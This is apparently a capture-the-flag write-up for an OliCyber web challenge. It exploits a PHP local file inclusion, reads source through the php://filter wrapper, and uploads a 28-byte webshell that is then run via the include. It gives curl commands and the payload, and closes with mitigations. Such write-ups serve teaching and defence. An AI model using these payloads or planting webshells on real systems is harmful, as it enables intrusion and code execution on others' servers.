# Shells' Revenge 2

**Competition:** OliCyber <br>
**Category:** Web <br>
**URL:** http://shellrevenge2.challs.olicyber.it

---

## Description
> Second version of Shells' Revenge
The flag is obtained by executing the command `/getflag`.

The site introduces a `page` parameter used to include pages dynamically.

---

## Solution

### 1. Initial reconnaissance

The main page contains a form with `action="index.php?page=upload.php"`. The `page` parameter is suspicious and may be a Local File Inclusion (LFI).

Read sources via the PHP filter wrapper:

```bash
curl -s "http://shellrevenge2.challs.olicyber.it/index.php?page=php://filter/convert.base64-encode/resource=index.php"
curl -s "http://shellrevenge2.challs.olicyber.it/index.php?page=php://filter/convert.base64-encode/resource=upload.php"
```

### 2. Source analysis

**index.php:**
```php
include($_GET["page"]);
```

No filtering — full LFI on any file in the filesystem.

**upload.php** (relevant parts):
```php
$name = basename($_FILES['file']['name']);
$name = htmlspecialchars($name);

if ($_FILES['file']['size'] > 100) {
    $err = 'size';
} else {
    move_uploaded_file($_FILES['file']['tmp_name'], $des);
}
```

- No extension filtering
- 100 byte upload size limit
- Upload directory: `uploads/md5(REMOTE_ADDR)/`

### 3. Vulnerability — File upload + LFI = RCE

The two issues combined allow remote code execution:

1. Upload a PHP webshell ≤ 100 bytes
2. Include it via the LFI to execute it

### 4. Exploit

Create a small webshell (28 bytes):

```bash
echo '<?php system("/getflag"); ?>' > shell.php
```

Upload it:

```bash
curl -s -X POST "http://shellrevenge2.challs.olicyber.it/index.php?page=upload.php" \
  -F "file=@shell.php" \
  -F "submit=Invia"
```

Response: `Upload completed! /uploads/f6043818345fdff6227e343cb137620e/shell.php`

Execute via LFI:

```bash
curl -s "http://shellrevenge2.challs.olicyber.it/index.php?page=uploads/f6043818345fdff6227e343cb137620e/shell.php"
```

---

## Flag

```
flag{...}
```

---

## Conclusions

This vulnerability is the combination of **Unrestricted File Upload** and **Local File Inclusion**:

- `upload.php` does not validate file extensions → `.php` can be uploaded
- `index.php` includes arbitrary files from user input → uploaded file can be included and executed

**Mitigations:**
- Validate file extensions server-side (whitelist)
- Do not pass user input directly to `include()`; use a static map of allowed pages
- Store uploads outside the document root or with non-executable extensions
